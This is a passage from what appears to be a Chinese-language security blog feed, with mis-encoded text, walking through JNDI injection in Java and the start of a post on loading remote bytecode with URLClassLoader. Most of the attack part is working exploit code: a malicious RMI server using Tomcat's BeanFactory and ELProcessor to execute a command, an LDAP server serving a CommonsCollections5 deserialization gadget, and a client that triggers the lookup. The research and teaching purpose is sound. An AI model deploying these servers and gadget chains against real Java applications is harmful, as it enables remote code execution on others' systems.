class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-dbcp<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>9.0.8<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>9.0.8<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-jasper<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>9.0.8<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Serverï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> org.apache.naming.ResourceRef;<br><br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Server</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;javax.el.ELProcessor&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">true</span>,<span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="hljs-literal">null</span>);<br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;x=eval&quot;</span>));<br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>));<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(ref);<br>        r.bind(<span class="hljs-string">&quot;evil&quot;</span>,referenceWrapper);<br>        System.out.println(<span class="hljs-string">&quot;running&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åˆ†æç•¥ï¼Œçœ‹åŸæ–‡å»å§ã€‚</p><p>è¿™é‡Œç›´æ¥ç»™å‡ºï¼Œ<code>method.invoke</code>çš„è§¦å‘å¯¹è±¡éœ€æ»¡è¶³ï¼š</p><ul><li>æœ‰æ— å‚æ„é€ å™¨ï¼ˆ<code>beanClass.getConstructor().newInstance()</code>è°ƒç”¨æ— å‚æ„é€ å™¨ï¼‰</li><li>æœ‰ä¸€ä¸ªå¯åˆ©ç”¨çš„æ–¹æ³•ï¼Œä¸”è¯¥æ–¹æ³•æ¥æ”¶ä¸”åªæ¥æ”¶ä¸€ä¸ªStringç±»å‹å‚æ•°ï¼ˆvalueArrayæ˜¯Stringç±»å‹çš„æ•°ç»„ï¼Œåªæœ‰ä¸€ä¸ªå…ƒç´ ï¼‰</li></ul><p>æœ¬åœ°åˆ©ç”¨çš„è°ƒç”¨æ ˆï¼š</p><blockquote><p><code>InitialContext#lookup()</code> <code>RegistryContext#lookup()</code> <code>RegistryContext#decodeObject()</code> <code>NamingManager#getObjectInstance()</code> <code>objectfactory = NamingManager#getObjectFactoryFromReference()</code> <code>Class#newInstance()</code> &#x2F;&#x2F;â€“&gt;æ¶æ„ä»£ç è¢«æ‰§è¡Œ </p><p>æˆ–: <code>objectfactory#getObjectInstance()</code> &#x2F;&#x2F;â€“&gt;æ¶æ„ä»£ç è¢«æ‰§è¡Œ</p></blockquote><h3 id="ldapè¿”å›åºåˆ—åŒ–å¯¹è±¡"><a href="#ldapè¿”å›åºåˆ—åŒ–å¯¹è±¡" class="headerlink" title="ldapè¿”å›åºåˆ—åŒ–å¯¹è±¡"></a>ldapè¿”å›åºåˆ—åŒ–å¯¹è±¡</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.unboundid<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Serverï¼šç”¨CC5</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.Entry;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.ResultCode;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<br><span class="hljs-keyword">import</span> javax.net.SocketFactory;<br><span class="hljs-keyword">import</span> javax.net.ssl.SSLSocketFactory;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.InetAddress;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Server</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LDAP_BASE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dc=example,dc=com&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">( String[] tmp_args )</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        String[] args=<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;http://127.0.0.1/#calc&quot;</span>&#125;;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">1389</span>;<br><br>        <span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);<br>        config.setListenerConfigs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryListenerConfig</span>(<br>                <span class="hljs-string">&quot;listen&quot;</span>,<br>                InetAddress.getByName(<span class="hljs-string">&quot;0.0.0.0&quot;</span>),<br>                port,<br>                ServerSocketFactory.getDefault(),<br>                SocketFactory.getDefault(),<br>                (SSLSocketFactory) SSLSocketFactory.getDefault()));<br><br>        config.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OperationInterceptor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(args[ <span class="hljs-number">0</span> ])));<br>        <span class="hljs-type">InMemoryDirectoryServer</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServer</span>(config);<br>        System.out.println(<span class="hljs-string">&quot;Listening on 0.0.0.0:&quot;</span> + port);<br>        ds.startListening();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperationInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InMemoryOperationInterceptor</span> &#123;<br><br>        <span class="hljs-keyword">private</span> URL codebase;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">OperationInterceptor</span> <span class="hljs-params">( URL cb )</span> &#123;<br>            <span class="hljs-built_in">this</span>.codebase = cb;<br>        &#125;<br><br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSearchResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result )</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> result.getRequest().getBaseDN();<br>            <span class="hljs-type">Entry</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>(base);<br>            <span class="hljs-keyword">try</span> &#123;<br>                sendResult(result, base, e);<br>            &#125;<br>            <span class="hljs-keyword">catch</span> ( Exception e1 ) &#123;<br>                e1.printStackTrace();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>            <span class="hljs-type">URL</span> <span class="hljs-variable">turl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-built_in">this</span>.codebase, <span class="hljs-built_in">this</span>.codebase.getRef().replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>).concat(<span class="hljs-string">&quot;.class&quot;</span>));<br>            System.out.println(<span class="hljs-string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="hljs-string">&quot; redirecting to &quot;</span> + turl);<br>            e.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;foo&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cbstring</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.codebase.toString();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">refPos</span> <span class="hljs-operator">=</span> cbstring.indexOf(<span class="hljs-string">&#x27;#&#x27;</span>);<br>            <span class="hljs-keyword">if</span> ( refPos &gt; <span class="hljs-number">0</span> ) &#123;<br>                cbstring = cbstring.substring(<span class="hljs-number">0</span>, refPos);<br>            &#125;<br><br>            e.addAttribute(<span class="hljs-string">&quot;javaSerializedData&quot;</span>,CommonsCollections5());<br><br>            result.sendSearchEntry(e);<br>            result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode.SUCCESS));<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] CommonsCollections5() <span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        ChainedTransformer chainedTransformer=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        Map map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        Map lazyMap=LazyMap.decorate(map,chainedTransformer);<br>        TiedMapEntry tiedMapEntry=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap,<span class="hljs-string">&quot;test&quot;</span>);<br>        BadAttributeValueExpException badAttributeValueExpException=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        Field field=badAttributeValueExpException.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(badAttributeValueExpException,tiedMapEntry);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(badAttributeValueExpException);<br>        objectOutputStream.close();<br><br>        <span class="hljs-keyword">return</span> byteArrayOutputStream.toByteArray();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Client:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ldap://127.0.0.1:1389/calc&quot;</span>;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        initialContext.lookup(url);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/30/JNDI/image-20240730212849450.png" alt="image-20240730212849450"></p><p>åŸç†ä¹Ÿå°±æ˜¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">LdapCtx#c_lookup =&gt; <br>decodeObject =&gt; <br>deserializeObject<br></code></pre></td></tr></table></figure><p><img src="/2024/07/30/JNDI/image-20240730212609194.png" alt="image-20240730212609194"></p><p>å‚è€ƒï¼š</p><p><a href="https://mp.weixin.qq.com/s/khc-2oyNOA7-MeB0COl31g">JNDIæ³¨å…¥åˆ†æ (qq.com)</a></p><p><a href="https://p4d0rn.gitbook.io/java/prerequisites/rmi-and-jndi/jndi#jndi-ldap">JNDI | Java (gitbook.io)</a></p><p><a href="http://ww25.yongsheng.site/2022/07/18/JNDI-attack/?subid1=20240730-2329-3605-89e6-4e26b297e35b">yongsheng.site</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaWeb-åŠ¨æ€åŠ è½½å­—èŠ‚ç </title>
    <link href="/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/"/>
    <url>/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<p>è¿™æ¬¡ç»­ä¸ŠCC3é‡Œæ²¡è®²å®Œçš„åŠ¨æ€åŠ è½½å­—èŠ‚ç ã€‚</p><h2 id="åˆ©ç”¨-URLClassLoader-åŠ è½½è¿œç¨‹classæ–‡ä»¶"><a href="#åˆ©ç”¨-URLClassLoader-åŠ è½½è¿œç¨‹classæ–‡ä»¶" class="headerlink" title="åˆ©ç”¨ URLClassLoader åŠ è½½è¿œç¨‹classæ–‡ä»¶"></a>åˆ©ç”¨ URLClassLoader åŠ è½½è¿œç¨‹classæ–‡ä»¶</h2><p>Javaçš„<code>ClassLoader</code>æ¥ç”¨æ¥åŠ è½½å­—èŠ‚ç æ–‡ä»¶æœ€åŸºç¡€çš„æ–¹æ³•ã€‚</p><p>å­¦åˆ°è¿™é‡Œï¼ŒçŸ¥é“åå°„çš„äººåº”è¯¥ä¹Ÿå¾ˆæ¸…æ¥šï¼Œ<code>ClassLoader</code>å°±æ˜¯ä¸€ä¸ªâ€œåŠ è½½å™¨â€ï¼Œå‘Šè¯‰Javaè™šæ‹Ÿæœºå¦‚ä½•åŠ è½½è¿™ä¸ªç±»ã€‚Javaé»˜è®¤çš„<code>ClassLoader</code>å°±æ˜¯æ ¹æ®ç±»åæ¥åŠ è½½ç±»ï¼Œè¿™ä¸ªç±»åæ˜¯ç±»å®Œæ•´è·¯å¾„ï¼Œå¦‚ <code>java.lang.Runtime</code> ã€‚</p><p><code>ClassLoader</code>çš„æ¦‚å¿µçš„ç¡®å¾ˆå®½æ³›ï¼Œæ‰€ä»¥æˆ‘ä¹Ÿä¸åšæ·±å…¥åˆ†æï¼Œè¿™é‡Œè¦è¯´åˆ°çš„æ˜¯è¿™ä¸ª </p><p><code>ClassLoader</code>ï¼š <code>URLClassLoader</code> </p><p><code>URLClassLoader</code>å®é™…ä¸Šæ˜¯æˆ‘ä»¬å¹³æ—¶é»˜è®¤ä½¿ç”¨çš„<code>AppClassLoader</code>çš„çˆ¶ç±»ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬è§£é‡Š<code>URLClassLoader</code>çš„å·¥ä½œè¿‡ç¨‹å®é™…ä¸Šå°±æ˜¯åœ¨è§£é‡Šé»˜è®¤çš„Javaç±»åŠ è½½å™¨çš„å·¥ä½œæµç¨‹ã€‚ </p><p>æ­£å¸¸æƒ…å†µä¸‹ï¼ŒJavaä¼šæ ¹æ®é…ç½®é¡¹<code>sun.boot.class.path</code>å’Œ<code>java.class.path</code>ä¸­åˆ—ä¸¾åˆ°çš„åŸºç¡€è·¯å¾„ï¼ˆè¿™äº›è·¯å¾„æ˜¯ç»è¿‡å¤„ç†åçš„<code>java.net.URL</code>ç±»ï¼‰æ¥å¯»æ‰¾.classæ–‡ä»¶æ¥åŠ è½½ã€‚</p><p>è€Œè¿™ä¸ªåŸºç¡€è·¯å¾„æœ‰åˆ†ä¸ºä¸‰ç§æƒ…å†µï¼š </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Â·URLæœªä»¥æ–œæ /ç»“å°¾ï¼Œåˆ™è®¤ä¸ºæ˜¯ä¸€ä¸ªJARæ–‡ä»¶ï¼Œä½¿ç”¨JarLoaderæ¥å¯»æ‰¾ç±»ï¼Œå³ä¸ºåœ¨JaråŒ…ä¸­å¯»æ‰¾.classæ–‡ä»¶ <br>Â·URLä»¥æ–œæ /ç»“å°¾ï¼Œä¸”åè®®åæ˜¯fileï¼Œåˆ™ä½¿ç”¨FileLoaderæ¥å¯»æ‰¾ç±»ï¼Œå³ä¸ºåœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­å¯»æ‰¾.classæ–‡ä»¶<br>Â·URLä»¥æ–œæ /ç»“å°¾ï¼Œä¸”åè®®åä¸æ˜¯fileï¼Œåˆ™ä½¿ç”¨æœ€åŸºç¡€çš„Loaderæ¥å¯»æ‰¾ç±» <br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬æ­£å¸¸å¼€å‘çš„æ—¶å€™é€šå¸¸é‡åˆ°çš„æ˜¯å‰ä¸¤è€…ï¼Œé‚£ä»€ä¹ˆæ—¶å€™æ‰ä¼šå‡ºç°ä½¿ç”¨Loaderå¯»æ‰¾ç±»çš„æƒ…å†µå‘¢ï¼Ÿ</p><p>å½“ç„¶æ˜¯éfileåè®®çš„æƒ…å†µä¸‹ï¼Œæœ€å¸¸è§çš„å°±æ˜¯<strong>httpåè®®</strong>ã€‚</p><p>HTTPå°æµ‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloClassLoader</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        URL[] urls = &#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://localhost:8000/&quot;</span>)&#125;;<br>        <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">loader</span> <span 